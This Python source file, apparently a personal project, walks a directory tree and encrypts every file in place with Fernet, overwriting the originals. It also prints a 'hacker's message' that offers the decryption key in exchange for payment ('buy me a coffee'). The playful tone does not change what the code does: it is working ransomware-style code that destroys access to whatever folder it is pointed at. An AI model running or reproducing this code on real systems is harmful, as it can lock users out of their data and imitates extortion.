# Codes related to encryption
#
# Author: Indrajit Ghosh
#
# Created on: Dec 24, 2022
#

from pathlib import Path
import sys, os, time

from cryptography.fernet import Fernet

CWD = Path.cwd()

THIS_SCRIPT = Path(__file__).absolute()
MAIN_DOT_PY = THIS_SCRIPT.resolve().parent / 'main.py'
DOT_ENCRYPTED_FILENAME = '.encrypted'

NOT_TO_ENCRYPT = [
    THIS_SCRIPT,
    MAIN_DOT_PY,
]


def format_time(time:float):
    """
    This method formats a given time in sec and returns a str for it.
    For example, 
    >>> format_time(time=46)
        '45 s'
    >>> format_time(time=67)
        '1m 7s'
    >>> format_time(time=130)
        '2h 10m'
    """
    s = time % 60
    m = int((time - s) / 60) % 60
    h = int((((time - s) / 60) - m) / 60)
    
    s_str = f'{round(s, 3)}s' if s > 0 else ''
    m_str = f"{m}m " if m > 0 else ''
    h_str = f"{h}h " if h > 0 else ''

    return h_str + m_str + s_str


class ByteSize(int):
    
    _KB = 1024
    _suffixes = 'B', 'KB', 'MB', 'GB', 'PB'

    def __new__(cls, *args, **kwargs):
        return super().__new__(cls, *args, **kwargs)

    def __init__(self, *args, **kwargs):
        self.bytes = self.B = int(self)
        self.kilobytes = self.KB = self / self._KB**1
        self.megabytes = self.MB = self / self._KB**2
        self.gigabytes = self.GB = self / self._KB**3
        self.petabytes = self.PB = self / self._KB**4
        *suffixes, last = self._suffixes
        suffix = next((
            suffix
            for suffix in suffixes
            if 1 < getattr(self, suffix) < self._KB
        ), last)
        self.readable = suffix, getattr(self, suffix)

        super().__init__()

    def __str__(self):
        return self.__format__('.2f')

    def __repr__(self):
        return '{}({})'.format(self.__class__.__name__, super().__repr__())

    def __format__(self, format_spec):
        suffix, val = self.readable
        return '{val:{fmt}} {suf}'.format(val=val, fmt=format_spec, suf=suffix)

    def __sub__(self, other):
        return self.__class__(super().__sub__(other))

    def __add__(self, other):
        return self.__class__(super().__add__(other))
    
    def __mul__(self, other):
        return self.__class__(super().__mul__(other))

    def __rsub__(self, other):
        return self.__class__(super().__sub__(other))

    def __radd__(self, other):
        return self.__class__(super().__add__(other))
    
    def __rmul__(self, other):
        return self.__class__(super().__rmul__(other)) 


def encrypt_file(filepath:Path, fernet_file:Path, print_status=True):
    """
    Encrypts a file using Fernet.
    
    Arguments:
    ----------
        `filepath`: Path() of the file to encrypt
        `fernet_file`: Path() of the fernet key 
        `print_status`: 

    Returns:
    --------
        file_size_after_encryption
    """
    filepath = Path(filepath)

    # generate new fernet key
    fernet_key = open(fernet_file, 'rb').read()

    # creating Fernet object
    fer = Fernet(fernet_key)

    # encrypt the file with fernet key
    msg = open(filepath, 'rb').read()
    msg_encrypted = fer.encrypt(data=msg)

    # save the encrypted file
    with open(filepath, 'wb') as f:
        f.write(msg_encrypted)

    size_after_encryption = filepath.stat().st_size # File size after encryption
        

    # display hacker's message
    hacked = """
    NOTE: Your file has been encrypted! If you want the decryption key;
    buy me a coffee. I'll then send you the `private_key` which 
    you can use to decrypt your file.
    Cheers!
    Best,
    Indrajit (SRF, SMU, ISIBc)
    """
    if print_status:
        print(hacked)

    
    return size_after_encryption



def _get_files_in(dir:Path, ignore:list=None):
    """
    Returns all files of the directory and of all its subdirectories.
    Arguments:
    ----------
        `dir`: `Path`; path of the directory
        `ignore`: `list`; list of paths to be ignored. defaults to None
    """
    dir = Path(dir)
    ignore = [] if ignore is None else ignore

    for path, subdir, files in os.walk(dir):
        for name in files:
            filepath = Path(path) / name
            if filepath not in ignore:
                yield filepath


def _encrypt_dir_tree(root_dir:Path, fernet_file:Path, ignore:list=None, silent:bool=True):
    """
    Encrypt each files in a dir and its subdirectories.
    Returns:
    --------
        tuple(`int`, ByteSize()): (total number of files encrypted, total size in Bytes)
    """

    file_count = 0
    data_size = 0

    root_dir = Path(root_dir)
    ignore = NOT_TO_ENCRYPT if ignore is None else NOT_TO_ENCRYPT + ignore

    for file in _get_files_in(root_dir, ignore):
        file_count += 1
        data_size += file.stat().st_size
        if not silent:
            print(f"Encrypting '{file}'")

        encrypt_file(
            filepath=file,
            fernet_file=fernet_file,
            print_status=False
        )

    return file_count, ByteSize(data_size)


def encrypt_dir(root_dir:Path, fernet_file:Path, silent=False):
    """
    Use `_encrypt_dir_tree()` to encrypt all files in all subdirectories.
    """
    root_dir = Path(root_dir)
    already_encrypted = 0

    # Writing the `.encrypted` file; this file contains either 1 or 0 
    # accordingly the dir is encrypted or not: 1: True , 0: False
    dot_enc_file = root_dir / DOT_ENCRYPTED_FILENAME
        
    if dot_enc_file.exists():
        already_encrypted = int(open(dot_enc_file).read())
        if already_encrypted:
            print(f"WARNING: The directory '{root_dir.name}' is already encrypted!\n")
            sys.exit()


    # Encrypt the dir
    _ignore = [dot_enc_file]

    t1 = time.time()
    total_encrypted_files, encrypted_data_size = _encrypt_dir_tree(
        root_dir=root_dir, ignore=_ignore, silent=silent, fernet_file=fernet_file
    )
    t2 = time.time()
    time_taken = format_time(t2-t1)

    # Change the status in `.encrypted`
    with open(dot_enc_file, 'w') as f:
        f.write('1')


    if not silent:
        # Inform the user
        print(f"\nAll files in the directory '{root_dir}' are now encrypted.\nTotal files encrypted: {total_encrypted_files}\n"),
        print(f"Total size of data encrypted: {encrypted_data_size:.3f}\n")
        print(f"Total time taken: {time_taken}")
        print("\nCheers!\n\nFrom,\nIndrajit\n")



def main():
    print('Encryption!')


if __name__ == '__main__':
    main()